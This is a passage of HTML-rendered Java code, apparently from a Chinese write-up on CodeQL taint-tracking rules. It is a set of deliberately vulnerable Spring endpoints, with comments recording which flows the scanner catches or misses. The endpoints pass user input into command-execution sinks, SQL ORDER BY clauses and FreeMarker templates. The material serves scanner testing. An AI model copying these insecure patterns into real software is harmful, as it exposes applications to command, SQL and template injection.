punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> dstest<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        DSUser dsUser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSUser</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dsUser<span class="token punctuation">.</span>pass <span class="token operator">=</span> command<span class="token punctuation">;</span>                      <span class="token comment" spellcheck="true">// 新对象的属性被污染</span>        <span class="token keyword">return</span> <span class="token function">testExecDSUserPassGet</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/sec8testExecDSUserUserGet"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">sec8testExecDSUserUserGet</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        DSTest dstest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span>cmd <span class="token operator">=</span> cmd<span class="token punctuation">;</span>        dstest<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">"zhangsan"</span><span class="token punctuation">;</span>        String command <span class="token operator">=</span> dstest<span class="token punctuation">.</span><span class="token function">getCmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> dstest<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        DSUser dsUser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSUser</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dsUser<span class="token punctuation">.</span>pass <span class="token operator">=</span> command<span class="token punctuation">;</span>                      <span class="token comment" spellcheck="true">// 新对象的属性被污染</span>        <span class="token keyword">return</span> <span class="token function">testExecDSUserUserGet</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 下面的例子分析构造函数是否会处理域敏感问题，结果显示是会处理的</span>    <span class="token comment" spellcheck="true">// codeql默认的TaintStep不会扫出下面的链路，</span>    <span class="token comment" spellcheck="true">// codeql默认的TaintStep在DSUser dsUser = new DSUser(cmd)表达式中会将dsUser的cmd属性污染，但是因为后面重构的isAdditionalTaintStep，导致将整个对象标记为污染了。所以产生了如下的误报。</span>    <span class="token comment" spellcheck="true">// 因此通过m instanceof GetterMethod的方法将所有调用了getXXXX的链路都走codeql默认的TaintStep，从而解决了如下的误报</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/sec9testExecDSUserUserGet"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">sec9testExecDSUserUserGet</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        DSUser dsUser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSUser</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 新对象被污染</span>        dsUser<span class="token punctuation">.</span><span class="token function">setUser</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">testExecDSUserUserGet</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// [+] CodeQL默认的TaintStep可以扫出来</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vul10testExecDSUserCmdGet"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">vul10testExecDSUserCmdGet</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        DSUser dsUser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSUser</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 新对象被污染</span>        dsUser<span class="token punctuation">.</span><span class="token function">setUser</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">testExecDSUserCmdGet</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 场景</span>    <span class="token comment" spellcheck="true">// 模拟xml的sql注入-orderByCause的注入点,vul11testExec和vul12testExec作比较</span>    <span class="token comment" spellcheck="true">// 问题：</span>    <span class="token comment" spellcheck="true">// 之所以vul11testExec扫不出来，而vul12testExec能够扫出来，问题出在sink点一个是对象，一个是对象的属性，当sink是对象时，因为污染的是对象的属性，所以对象dsUser并不认为被污染，因此没扫出来</span>    <span class="token comment" spellcheck="true">// 当重构isAdditionalTaintStep时，因为默认的TaintStep没扫出来，然后经过我们的规则，在DSUser dsUser = new DSUser(cmd);时将dsUser设置为污染，</span>    <span class="token comment" spellcheck="true">// 因此到test.testExecDSUser(dsUser)时，sink点dsUser也是污染的。所以能够扫出来，但也会因此造成误报。</span>    <span class="token comment" spellcheck="true">// 解决方案</span>    <span class="token comment" spellcheck="true">// 获取sink的被污染的属性</span>    <span class="token comment" spellcheck="true">// [-] CodeQL默认的TaintStep扫不出来</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vul11testExec"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">vul11testExec</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        DSUser dsUser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSUser</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 新对象被污染</span>        dsUser<span class="token punctuation">.</span><span class="token function">setUser</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TestExec test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestExec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> test<span class="token punctuation">.</span><span class="token function">testExecDSUser</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">// select cmd form</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// [+] CodeQL默认的TaintStep扫出来</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vul12testExec"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">vul12testExec</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        DSUser dsUser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSUser</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 新对象被污染</span>        dsUser<span class="token punctuation">.</span><span class="token function">setUser</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TestExec test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestExec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> test<span class="token punctuation">.</span><span class="token function">testExecDSUserCmd</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">.</span><span class="token function">getCmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// [-] CodeQL默认的TaintStep扫不出来</span>    <span class="token comment" spellcheck="true">// 模拟DA186DE56A57D9697A1791B37D6E0E20漏洞的误报</span>    <span class="token comment" spellcheck="true">// 经过了一层函数exampleAssemble</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vul13testExec"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">vul13testExec</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        DSTest dsTest <span class="token operator">=</span> <span class="token function">exampleAssemble</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        TestExec test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestExec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> test<span class="token punctuation">.</span><span class="token function">testExecDSTest</span><span class="token punctuation">(</span>dsTest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> DSTest <span class="token function">exampleAssemble</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span><span class="token punctuation">{</span>        DSTest dsTest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dsTest<span class="token punctuation">.</span>cmd <span class="token operator">=</span> cmd<span class="token punctuation">;</span>        <span class="token keyword">return</span> dsTest<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// CodeQL默认扫不出来</span>    <span class="token comment" spellcheck="true">// 不走过滤构造函数-即走兜底的规则 应该要扫出来</span>    <span class="token comment" spellcheck="true">// 走过滤构造函数 应该要扫不出来      主要解决该情况</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vul14testExec"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">vul14testExec</span><span class="token punctuation">(</span>String templateContent<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> TemplateException <span class="token punctuation">{</span>        Configuration cfg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        StringTemplateLoader stringLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringTemplateLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        DSUser dsUser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSUser</span><span class="token punctuation">(</span>templateContent<span class="token punctuation">)</span><span class="token punctuation">;</span>        stringLoader<span class="token punctuation">.</span><span class="token function">putTemplate</span><span class="token punctuation">(</span><span class="token string">"tpl"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>dsUser<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cfg<span class="token punctuation">.</span><span class="token function">setTemplateLoader</span><span class="token punctuation">(</span>stringLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        Template template <span class="token operator">=</span> cfg<span class="token punctuation">.</span><span class="token function">getTemplate</span><span class="token punctuation">(</span><span class="token string">"tpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        StringWriter stringWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//在模版上执行插值操作，并输出到制定的输出流中</span>        template<span class="token punctuation">.</span><span class="token function">process</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span> stringWriter<span class="token punctuation">)</span><span class="token punctuation">;</span>        String resultStr <span class="token operator">=</span> stringWriter<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>resultStr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// CodeQL默认扫不出来</span>    <span class="token comment" spellcheck="true">// 走了兜底函数，在 stringLoader.putTemplate("tpl", dsUser.getCmd()); 这里经过我们的兜底函数，将stringLoader污染了，所以能够扫出来</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vul15testExec"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">vul15testExec</span><span class="token punctuation">(</span>String templateContent<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> TemplateException <span class="token punctuation">{</span>        Configuration cfg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        StringTemplateLoader stringLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringTemplateLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        DSUser dsUser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DSUser</span><span class="token punctuation">(</span>templateContent<span class="token punctuation">)</span><span class="token punctuation">;</span>        stringLoader<span class="token punctuation">.</span><span class="token function">putTemplate</span><span class="token punctuation">(</span><span class="token string">"tpl"</span><span class="token punctuation">,</span> dsUser<span class="token punctuation">.</span><span class="token function">getCmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cfg<span class="token punctuation">.</span><span class="token function">setTemplateLoader</span><span class="token punctuation">(</span>stringLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        Template template <span class="token operator">=</span> cfg<span class="token punctuation">.</span><span class="token function">getTemplate</span><span class="token punctuation">(</span><span class="token string">"tpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        StringWriter stringWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//在模版上执行插值操作，并输出到制定的输出流中</span>        template<span class="token punctuation">.</span><span class="token function">process</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span> stringWriter<span class="token punctuation">)</span><span class="token punctuation">;</span>        String resultStr <span class="token operator">=</span> stringWriter<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>resultStr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// CodeQL默认扫出来</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vul16testExec"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">vul16testExec</span><span class="token punctuation">(</span>QueryRequest request<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        QueryExample example <span class="token operator">=</span> <span class="token function">buildExample</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>        TestExec test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestExec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> test<span class="token punctuation">.</span><span class="token function">testExampleSQL</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> QueryExample <span class="token function">buildExample</span><span class="token punctuation">(</span>QueryRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>        QueryExample example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">QueryExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        example<span class="token punctuation">.</span><span class="token function">setUser</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        example<span class="token punctuation">.</span><span class="token function">setOrderByClause</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getSortType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> example<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// CodeQL默认扫不出来</span>    <span class="token comment" spellcheck="true">// 检测是否是 HashMap导致没扫出来</span>    <span class="token comment" spellcheck="true">// 因为HashMap的get方法返回值不会被标记为污染，但因为走了兜底规则，将sortFieldMap.get(request.getUser())标记为了污点，然后成功扫出真实存在漏洞的链路</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vul17testExec"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">vul17testExec</span><span class="token punctuation">(</span>QueryRequest request<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        QueryExample example <span class="token operator">=</span> <span class="token function">buildExample2</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>        TestExec test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestExec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> test<span class="token punctuation">.</span><span class="token function">testExampleSQL</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> QueryExample <span class="token function">buildExample2</span><span class="token punctuation">(</span>QueryRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>        QueryExample example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">QueryExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        example<span class="token punctuation">.</span><span class="token function">setOrderByClause</span><span class="token punctuation">(</span><span class="token string">"created_at desc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        example<span class="token punctuation">.</span><span class="token function">setUser</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String field <span class="token operator">=</span> sortFieldMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        example<span class="token punctuation">.</span><span class="token function">setOrderByClause</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> example<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// CodeQL默认扫出来</span>    <span class="token comment" spellcheck="true">// 检测是否是 String.format()导致没扫出来</span>    <span class="token comment" spellcheck="true">// 说明String.format(taint) 会将结果标记为污染</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vul18testExec"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">vul18testExec</span><span class="token punctuation">(</span>QueryRequest request<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        QueryExample example <span class="token operator">=</span> <span class="token function">buildExample3</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>        TestExec test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestExec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> test<span class="token punctuation">.</span><span class="token function">testExampleSQL</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> QueryExample <span class="token function">buildExample3</span><span class="token punctuation">(</span>QueryRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>        QueryExample example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">QueryExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        example<span class="token punctuation">.</span><span class="token function">setOrderByClause</span><span class="token punctuation">(</span><span class="token string">"created_at desc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        example<span class="token punctuation">.</span><span class="token function">setUser</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String field <span class="token operator">=</span> sortFieldMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        example<span class="token punctuation">.</span><span class="token function">setOrderByClause</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>SORT_STR<span class="token punctuation">,</span> field<span class="token punctuation">,</span> field<span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">getSortType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> example<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vul19testExec"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">vul19testExec</span><span class="token punctuation">(</span>QueryRequest request<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        QueryExample example <span class="token operator">=</span> <span class="token function">buildExample4</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>        TestExec test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestExec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> test<span class="token punctuation">.</span><span class="token function">testExampleSQL</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> QueryExample <span class="token function">buildExample4</span><span class="token punctuation">(</span>QueryRequest request<span class="token punctuation">)</span> <span class="token punctuation">{</span>        QueryExample example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">QueryExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        example<span class="token punctuation">.</span><span class="token function">setOrderByClause</span><span class="token punctuation">(</span><span class="token string">"created_at desc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        example<span class="token punctuation">.</span><span class="token function">setUser</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String field <span class="token operator">=</span> sortFieldMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getSortType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            example<span class="token punctuation">.</span><span class="token function">setOrderByClause</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>SORT_STR<span class="token punctuation">,</span> field<span class="token punctuation">,</span> field<span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">getSortType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> example<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// [-] CodeQL默认的TaintStep扫不出来</span>    <span class="token comment" spellcheck="true">// 漏报问题</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/vul100"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">vul100</span><span class="token punctuation">(</span>String templateContent<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> TemplateException <span class="token punctuation">{</span>        Configuration cfg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        StringTemplateLoader stringLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringTemplateLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        stringLoader<span class="token punctuation">.</span><span class="token function">putTemplate</span><span class="token punctuation">(</span><span class="token string">"tpl"</span><span class="token punctuation">,</span> templateContent<span class="token punctuation">)</span><span class="token punctuation">;</span>        cfg<span class="token punctuation">.</span><span class="token function">setTemplateLoader</span><span class="token punctuation">(</span>stringLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>        Template template <span class="token operator">=</span> cfg<span class="token punctuation">.</span><span class="token function">getTemplate</span><span class="token punctuation">(</span><span class="token string">"tpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        StringWriter stringWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//在模版上执行插值操作，并输出到制定的输出流中</span>        template<span class="token punctuation">.</span><span class="token function">process</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span> stringWriter<span class="token punctuation">)</span><span class="token punctuation">;</span>        String resultStr <span class="token operator">=</span> stringWriter<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>resultStr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><